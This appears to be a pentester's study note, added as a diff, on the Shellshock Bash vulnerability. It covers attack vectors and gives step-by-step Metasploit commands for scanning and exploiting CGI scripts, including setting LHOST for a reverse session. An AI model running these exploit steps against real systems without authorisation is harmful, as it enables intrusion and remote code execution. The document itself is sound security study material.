@@ -1,0 +1,229 @@
+---
+id: Shellshock
+aliases: ["Bashdoor"]
+tags: 
+  - Linux/Vulnerabilities/Shellshock
+links: "Vulnerabilities"
+---
+
+# Shellshock
+
+[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
+a.k.a Bashdoor (*[CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271)*)
+is a family of security bugs in the UNIX [[Bash]] shell
+
+<!-- Info {{{-->
+> [!info]-
+>
+> GNU Bash through `4.3` processes trailing strings
+> after function definitionsuin the values of environment variables,
+> which allows remote attackers to execute arbitrary code
+> via a crafted environment, as demonstrated by vectors
+> involving
+>
+> - the `ForceCommand` feature in OpenSSH sshd
+> - the `mod_cgi` and `mod_cgid` modules in the Apache HTTP Server
+> - scripts executed by unspecified DHCP clients
+> - and other situations in which setting the environment occurs across
+>   a privilege boundary from Bash execution, aka "ShellShock"
+>
+> <!-- Note {{{-->
+> > [!note]
+> >
+> > The original fix for this issue was incorrect;
+> > [CVE-2014-7169](https://nvd.nist.gov/vuln/detail/cve-2014-7169)
+> > has been assigned to cover the vulnerability
+> > that is still present after the incorrect fix
+> >
+> <!-- }}} -->
+<!-- }}} -->
+
+___
+
+<!-- Exploitation Vectors {{{-->
+## Exploitation Vectors
+
+**CGI-based Web Server**
+
+When a web server uses the [Common Gateway Interface](https://en.wikipedia.org/wiki/Common_Gateway_Interface) (*CGI*)
+to handle a document request, it copies certain information
+from the request into the environment variable list
+and then delegates the request to a handler program
+
+If the handler is a Bash script, or if it executes Bash,
+then Bash will receive the environment variables passed by the server
+and will process them as described above
+
+```sh
+http://$target/cgi-bin/
+```
+
+**OpenSSH Server**
+
+OpenSSH has a `ForceCommand` feature,
+where a fixed command is executed when the user logs in,
+instead of just running an unrestricted command shell
+
+**DHCP Clients**
+
+Some DHCP clients can also pass commands to Bash;
+a vulnerable system could be attacked when connecting to an open Wi-Fi network.
+
+A DHCP client typically requests and gets an IP address from a DHCP server,
+but it can also be provided a series of additional options.
+
+A malicious DHCP server could provide, in one of these options,
+a string crafted to execute code on a vulnerable workstation or laptop
+
+**Qmail Server**
+
+When using Bash to process email messages
+(*e.g. through .forward or qmail-alias piping*),
+the [qmail mail server](https://en.wikipedia.org/wiki/Qmail)
+passes external input through in a way
+that can exploit a vulnerable version of Bash
+
+___
+<!-- }}} -->
+
+<!-- Enumeration {{{-->
+## Enumeration
+
+[[Metasploit]] - [Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/http/apache_mod_cgi_bash_env/)
+
+```sh
+use auxiliary/scanner/http/apache_mod_cgi_bash_env
+```
+
+<!-- Info {{{-->
+> [!info]-
+>
+> This module scans for the [[Shellshock]] vulnerability,
+> a flaw in how the Bash shell handles external environment variables.
+> This module targets CGI scripts in the Apache web server
+> by setting the `HTTP_USER_AGENT` environment variable to a
+> malicious function definition.
+>
+> <!-- Tip {{{-->
+> > [!tip]-
+> >
+> > Use `exploit/multi/handler` with a [[Metasploit#Payloads|Payload]]
+> > appropriate to your CMD,
+> > set `ExitOnSession` to `false`, run -j,
+> > and then run this module to create sessions on vulnerable hosts
+> >
+> <!-- }}} -->
+>
+> <!-- Note {{{-->
+> > [!note]-
+> >
+> > Note that this is not the recommended method for obtaining shells.
+> >
+> > If you require sessions, please use the [apache_mod_cgi_bash_env_exec](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/)
+> > exploit module instead.
+> <!-- }}} -->
+>
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
+>
+> 1. Show missing options
+>
+> ```sh
+> show missing
+> ```
+> ```sh
+>    Name       Current Setting  Required  Description
+>    ----       ---------------  --------  -----------
+>    RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+>    TARGETURI                   yes       Path to CGI script
+> ```
+>
+> 2. Set target host
+>
+> ```sh
+> set RHOSTS $target
+> ```
+>
+> 3. Set path to CGI script
+>
+> ```sh
+> set TARGETURI /cgi-bin/script.sh
+> ```
+>
+> 4. Run the scanner
+>
+> ```sh
+> run
+> ```
+>
+<!-- }}} -->
+
+___
+<!-- }}} -->
+
+<!-- Exploitation {{{-->
+## Exploitation
+
+[[Metasploit]] - [Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/)
+
+```sh
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+```
+
+<!-- Info {{{-->
+> [!info]-
+>
+> This module exploits the Shellshock vulnerability,
+> a flaw in how the Bash shell handles external environment variables.
+>
+> This module targets CGI scripts in the Apache web server
+> by setting the `HTTP_USER_AGENT` environment variable
+> to a malicious function definition
+>
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
+>
+> 1. Show missing options
+>
+> ```sh
+> show missing
+> ```
+> ```sh
+>    Name       Current Setting  Required  Description
+>    ----       ---------------  --------  -----------
+>    RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+>    TARGETURI                   yes       Path to CGI script
+> ```
+>
+> 2. Set local host
+>
+> ```sh
+> set LHOST tun0
+> ```
+>
+> 3. Set target host
+>
+> ```sh
+> set RHOSTS $target
+> ```
+>
+> 4. Set path to CGI script
+>
+> ```sh
+> set TARGETURI /cgi-bin/script.sh
+> ```
+>
+> 5. Run the exploit
+>
+> ```sh
+> run
+> ```
+>
+<!-- }}} -->
+
+___
+<!-- }}} -->
